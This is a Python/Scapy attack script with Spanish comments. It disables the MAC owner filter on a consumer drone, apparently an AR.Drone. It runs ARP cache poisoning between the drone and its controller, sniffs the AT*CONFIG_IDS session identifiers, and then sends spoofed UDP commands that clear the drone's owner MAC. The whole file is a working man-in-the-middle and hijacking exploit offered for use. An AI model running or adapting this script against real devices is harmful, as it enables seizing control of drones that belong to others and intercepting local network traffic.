from scapy.all import *
import re, sys


# lectura de parametros

if len(sys.argv) < 4:
	print "Formato: sudo python deactivate_mac_filter.py ip_dispositivo MAC_dispositivo MAC_dron"
	exit()
else:
	patron_ip = re.compile('\d{0,255}\.\d{0,255}\.\d{0,255}\.\d{0,255}')
	patron_mac = re.compile('[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}\:[A-Fa-f0-9]{2}')
	if patron_ip.match(sys.argv[1]) is None or patron_mac.match(sys.argv[2]) is None or patron_mac.match(sys.argv[3]) is None:
		print "Formato: sudo python deactivate_mac_filter.py ip_dispositivo MAC_dispositivo MAC_dron"
		exit()


# Variables globales


sessionId = ""
userId = ""
appId = ""

arpPoisoningStarted = False

srcIP = sys.argv[1] # Ip del dispositivo
dstIP = '192.168.1.1' # IP del dron
srcPort = 5556 # Puerto origen
dstPort = 5556 # Puerto destino

srcMAC = sys.argv[2] # MAC del dispositivo
dstMAC = sys.argv[3] # MAC del dron


redirect_file = open('/proc/sys/net/ipv4/ip_forward','w')
try:
	redirect_file.write('1')
except:
	print "Necesitas permisos de root para ejecutar el script. Prueba ejecutandolo con sudo.\n"
	redirect_file.close()
	exit()

redirect_file.close()

#envenenamiento arp
print "Comenzamos ataque de envenenamiento de ARP"
thread.start_new_thread(arpcachepoison,(dstIP,srcIP,2))
thread.start_new_thread(arpcachepoison,(srcIP,dstIP,2))


def stopfilter(pkt):
	global sessionId, userId, appId
	if Raw in pkt and 'AT*CONFIG_IDS=' in pkt[Raw].load:
		p = re.compile("AT\*CONFIG_IDS=\d+,\"(\w+)\",\"(\w+)\",\"(\w+)\"")
		results = p.search(pkt[Raw].load)
		sessionId = results.group(1) 
		userId = results.group(2)
		appId = results.group(3)
		pkt.show()
		return True
	else:
		return False 

def pkt_callback(pkt):
	#global arpPoisoningStarted
	#if arpPoisoningStarted is False:
	#	arpcachepoison(dstIp,srcIP,interval = 2)
	#	arpPoisoningStarted = True
	print "Procesando paquetes..."



sniff(iface="wlan0", prn=pkt_callback, filter="udp and port 5556", stop_filter=stopfilter)

print "sessionId: " + sessionId
print "userId: " + userId
print "appId: " + appId

mac_filter_off = "AT*CONFIG_IDS=1,\""+sessionId+"\",\""+userId+"\",\""+appId+"\"\rAT*CONFIG=2,\"network:owner_mac\",\"00:00:00:00:00:00\"\r"
print mac_filter_off
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / mac_filter_off
spoofed_packet.show()
for i in range(20):
	sendp(spoofed_packet, iface="wlan0")
